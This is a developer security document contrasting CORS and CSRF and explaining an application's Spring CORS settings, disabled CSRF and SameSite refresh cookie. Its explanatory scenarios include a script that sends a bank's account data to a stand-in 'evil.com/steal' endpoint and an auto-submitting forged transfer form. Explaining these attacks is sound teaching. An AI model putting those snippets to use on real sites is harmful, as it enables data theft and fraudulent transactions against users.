# CORS vs CSRF: Security Configuration

This document explains the distinction between CORS and CSRF protections, why they address different security concerns, and how they are configured in this application.

## Table of Contents

- [CORS and CSRF Overview](#cors-and-csrf-overview)
- [Why They Are Different Problems](#why-they-are-different-problems)
- [When CSRF Is Required vs Not Required](#when-csrf-is-required-vs-not-required)
- [Configuration in This System](#configuration-in-this-system)
- [Security Implications](#security-implications)
- [Key Takeaways](#key-takeaways)

---

## CORS and CSRF Overview

### Quick Comparison

| Aspect               | CORS                                      | CSRF                                       |
|----------------------|-------------------------------------------|-------------------------------------------|
| **Full Name**        | Cross-Origin Resource Sharing             | Cross-Site Request Forgery                |
| **Purpose**          | Control which origins can access API      | Prevent unauthorized state-changing requests |
| **Attack Vector**    | Malicious site reading API responses      | Malicious site making requests as user    |
| **Browser Mechanism**| Same-Origin Policy enforcement            | Cookie auto-attachment                    |
| **Protection For**   | API data confidentiality                  | User action integrity                     |
| **Configuration**    | Server response headers                   | Token validation                          |

### Visual Distinction

```text
+-----------------------------------------------------------------+
|                    CORS PROTECTION                              |
+-----------------------------------------------------------------+
|                                                                 |
|  +------------------+                    +------------------+   |
|  |  evil-site.com   |                    |   Your API       |   |
|  |                  |    GET /api/data   |   localhost:8080 |   |
|  |  <script>        |------------------>|                  |   |
|  |    fetch(...)    |                    |  Response +      |   |
|  |  </script>       |<------------------|  CORS headers    |   |
|  +------------------+                    +------------------+   |
|                              |                                  |
|                              v                                  |
|           Browser checks: Is evil-site.com in                   |
|           Access-Control-Allow-Origin?                          |
|                              |                                  |
|              +---------------+---------------+                  |
|              v                               v                  |
|         +--------+                     +---------+              |
|         |  YES   |                     |   NO    |              |
|         | Allow  |                     |  Block  |              |
|         | access |                     | access  |              |
|         +--------+                     +---------+              |
|                                                                 |
|  CORS protects: Your API data from being READ by unauthorized   |
|                 origins                                         |
|                                                                 |
+-----------------------------------------------------------------+

+-----------------------------------------------------------------+
|                    CSRF PROTECTION                              |
+-----------------------------------------------------------------+
|                                                                 |
|  +------------------+                    +------------------+   |
|  |  evil-site.com   |                    |   Your API       |   |
|  |                  |  POST /api/transfer|   localhost:8080 |   |
|  |  <form action=   |------------------>|                  |   |
|  |    "...transfer">|    + Session       |  +------------+  |   |
|  |    <submit>      |      Cookie        |  | Validate   |  |   |
|  |  </form>         |      (auto)        |  | CSRF Token |  |   |
|  +------------------+                    |  +------------+  |   |
|                                          +------------------+   |
|                              |                                  |
|                              v                                  |
|           Server checks: Is valid CSRF token present?           |
|                              |                                  |
|              +---------------+---------------+                  |
|              v                               v                  |
|         +--------+                     +---------+              |
|         |  YES   |                     |   NO    |              |
|         | Allow  |                     |  Reject |              |
|         | action |                     | request |              |
|         +--------+                     +---------+              |
|                                                                 |
|  CSRF protects: Prevents unauthorized ACTIONS being performed   |
|                 using user's authenticated session              |
|                                                                 |
+-----------------------------------------------------------------+
```

---

## Why They Are Different Problems

### CORS Problem: Data Leakage

```
SCENARIO: User is logged into bank.com
         User visits evil.com which contains:

         <script>
           fetch('https://bank.com/api/accounts')
             .then(r => r.json())
             .then(data => {
               // Send user's account data to attacker
               fetch('https://evil.com/steal', {
                 method: 'POST',
                 body: JSON.stringify(data)
               });
             });
         </script>

WITHOUT CORS:
  - Browser makes request to bank.com
  - Browser includes bank.com cookies (user is authenticated)
  - Bank returns account data
  - JavaScript can read and exfiltrate the data

WITH CORS:
  - Browser makes request to bank.com
  - Browser includes bank.com cookies
  - Bank returns data + Access-Control-Allow-Origin: https://bank.com
  - Browser sees evil.com ≠ bank.com
  - Browser BLOCKS JavaScript from reading the response
  - Data never reaches evil.com's code
```

### CSRF Problem: Unauthorized Actions

```
SCENARIO: User is logged into bank.com
         User visits evil.com which contains:

         <form action="https://bank.com/api/transfer" method="POST">
           <input name="to" value="attacker-account">
           <input name="amount" value="10000">
         </form>
         <script>document.forms[0].submit();</script>

WITHOUT CSRF PROTECTION:
  - Browser submits form to bank.com
  - Browser includes bank.com session cookie (automatic!)
  - Bank sees valid session, processes transfer
  - Attacker receives $10,000

WITH CSRF PROTECTION:
  - Browser submits form to bank.com
  - Form lacks valid CSRF token (which evil.com couldn't obtain)
  - Bank rejects request: "Missing/invalid CSRF token"
  - No transfer occurs
```

### Key Insight

```text
+-----------------------------------------------------------------+
|              THE FUNDAMENTAL DIFFERENCE                         |
+-----------------------------------------------------------------+
|                                                                 |
|  CORS                           CSRF                            |
|  ----                           ----                            |
|  - Request ALWAYS goes through  - Request ALWAYS goes through   |
|  - Response is blocked by       - Request is rejected by        |
|    browser if origin invalid      server if token invalid       |
|  - Protects response DATA       - Protects state-changing       |
|  - Client-side enforcement        ACTIONS                       |
|                                 - Server-side enforcement       |
|                                                                 |
|  CORS: "You can't READ the answer"                              |
|  CSRF: "You can't PERFORM the action"                           |
|                                                                 |
+-----------------------------------------------------------------+
```

---

## When CSRF Is Required vs Not Required

### Decision Tree

```text
                    Does your app use
                    session cookies for
                    authentication?
                           |
              +------------+------------+
              v                         v
             YES                        NO
              |                         |
              v                         |
    +-----------------+                 |
    | CSRF PROTECTION |                 |
    |    REQUIRED     |                 |
    +-----------------+                 |
                                        |
                    +-------------------+-------------------+
                    |                                       |
                    v                                       v
            JWT in header?                          JWT in cookie?
                    |                                       |
                    v                                       v
    +-------------------------+           +-------------------------+
    | CSRF NOT REQUIRED       |           | CSRF Required for       |
    |                         |           | cookie-based JWT        |
    | Token must be manually  |           | OR use SameSite=Strict  |
    | added to requests       |           | to mitigate             |
    | (can't be auto-attached)|           +-------------------------+
    +-------------------------+
```

### This Application's Authentication Model

```text
+-----------------------------------------------------------------+
|           THIS APPLICATION'S TOKEN STRATEGY                     |
+-----------------------------------------------------------------+
|                                                                 |
|  +---------------------------------------------------------+   |
|  |  ACCESS TOKEN                                            |   |
|  |  - Sent in: Authorization header ("Bearer xxx")          |   |
|  |  - Storage: Client-side (localStorage/memory)            |   |
|  |  - Auto-attached by browser: NO                          |   |
|  |  - CSRF vulnerability: NO                                |   |
|  +---------------------------------------------------------+   |
|                                                                 |
|  +---------------------------------------------------------+   |
|  |  REFRESH TOKEN                                           |   |
|  |  - Sent in: HttpOnly cookie                              |   |
|  |  - Auto-attached by browser: YES                         |   |
|  |  - Protected by: SameSite=Lax                            |   |
|  |  - Only used for: /api/auth/refresh-token endpoint       |   |
|  |  - CSRF risk: MITIGATED                                  |   |
|  +---------------------------------------------------------+   |
|                                                                 |
|  CONCLUSION: Traditional CSRF protection NOT required          |
|                                                                 |
+-----------------------------------------------------------------+
```

### Why CSRF Is Disabled

```java
// SecurityConfig.java
http.csrf(AbstractHttpConfigurer::disable)
```

Rationale:

1. **State-changing requests require access token** in `Authorization` header
2. **Access token cannot be auto-attached** by browser (unlike cookies)
3. **Attacker cannot obtain** victim's access token from their own page
4. **No session cookies** are used for API authentication
5. **Refresh token cookie** is protected by `SameSite=Lax`:
   - Only sent on same-site requests
   - Only sent on top-level navigations (not from embedded scripts)
   - Only used for token refresh, not state-changing operations

---

## Configuration in This System

### CORS Configuration

```java
// SecurityConfig.java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();

    // Allowed origins (frontend applications)
    configuration.setAllowedOrigins(List.of(
        "http://localhost:3000",  // Development frontend
        "http://localhost:3001"   // Alternative port
    ));

    // Allowed HTTP methods
    configuration.setAllowedMethods(List.of(
        "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"
    ));

    // Allow all headers (including Authorization)
    configuration.setAllowedHeaders(List.of("*"));

    // Allow credentials (cookies for refresh token)
    configuration.setAllowCredentials(true);

    // Preflight cache duration (1 hour)
    configuration.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

### CORS Headers Explained

| Header                             | Value                              | Purpose                          |
|------------------------------------|------------------------------------|----------------------------------|
| `Access-Control-Allow-Origin`      | `http://localhost:3000`            | Allowed requesting origins       |
| `Access-Control-Allow-Methods`     | `GET, POST, PUT, DELETE, PATCH`    | Allowed HTTP methods             |
| `Access-Control-Allow-Headers`     | `*`                                | Allowed request headers          |
| `Access-Control-Allow-Credentials` | `true`                             | Allow cookies to be sent         |
| `Access-Control-Max-Age`           | `3600`                             | Preflight cache (seconds)        |

### CSRF Configuration

```java
// SecurityConfig.java
http.csrf(AbstractHttpConfigurer::disable)
```

**Why disabled:**
- Stateless JWT authentication (no session)
- Access token in header (not auto-attached)
- SameSite cookie protection for refresh token

### Refresh Token Cookie Configuration

```java
// RefreshCookieService.java
ResponseCookie.from(Constants.REFRESH_TOKEN_COOKIE_NAME, value)
    .httpOnly(true)           // Not accessible via JavaScript
    .secure(cookieSecure)     // HTTPS only in production
    .path("/")                // Sent on all paths
    .sameSite("Lax")          // CSRF mitigation
    .maxAge(maxAge)
    .build();
```

---

## Security Implications

### Current Security Posture

```text
+-----------------------------------------------------------------+
|                   SECURITY ASSESSMENT                           |
+-----------------------------------------------------------------+
|                                                                 |
|  PROTECTED AGAINST:                                             |
|  -----------------                                              |
|  [Y] Cross-origin data theft (CORS restricts origins)          |
|  [Y] Session hijacking (No server sessions)                    |
|  [Y] CSRF on API calls (Token in header, not cookie)           |
|  [Y] Cookie theft via XSS (HttpOnly refresh token)             |
|  [Y] Cross-site refresh token abuse (SameSite=Lax)             |
|                                                                 |
|  POTENTIAL RISKS:                                               |
|  ---------------                                                |
|  [!] XSS can steal access token from localStorage              |
|      Mitigation: Store in memory, use short expiration         |
|                                                                 |
|  [!] Refresh token in Lax mode sent on top-level navigation   |
|      Mitigation: Only /api/auth/refresh-token accepts it       |
|                                                                 |
|  [!] CORS misconfiguration if wildcards used in production    |
|      Mitigation: Explicit origin list, no wildcards            |
|                                                                 |
+-----------------------------------------------------------------+
```

### Production Recommendations

| Setting                      | Development                    | Production                     |
|------------------------------|--------------------------------|--------------------------------|
| CORS Origins                 | `localhost:3000,3001`          | Exact production domain(s)     |
| Cookie Secure                | `false`                        | `true` (HTTPS only)            |
| SameSite                     | `Lax`                          | `Lax` or `Strict`              |
| Access Token Storage         | localStorage (convenient)       | Memory (more secure)           |
| Access Token Lifetime        | Longer (development ease)       | Short (15-30 min)              |

---

## Key Takeaways

1. **CORS ≠ CSRF**: They solve different problems; CORS protects data reading, CSRF protects actions
2. **CSRF Not Needed for JWT**: When authentication requires a manually-attached header, CSRF is unnecessary
3. **SameSite as Defense**: The refresh token cookie uses `SameSite=Lax` as a modern CSRF mitigation
4. **CORS Is Restrictive**: Only explicitly whitelisted origins can access API responses
5. **Credentials Mode**: `allowCredentials=true` is required for the refresh token cookie to be sent
6. **HttpOnly Cookie**: Prevents XSS from stealing the refresh token; access token remains vulnerable to XSS
7. **No Wildcards in Production**: Never use `*` for `allowedOrigins` when `allowCredentials=true`
8. **Defense in Depth**: While CSRF is disabled, multiple layers (stateless auth, SameSite, header-based token) provide protection
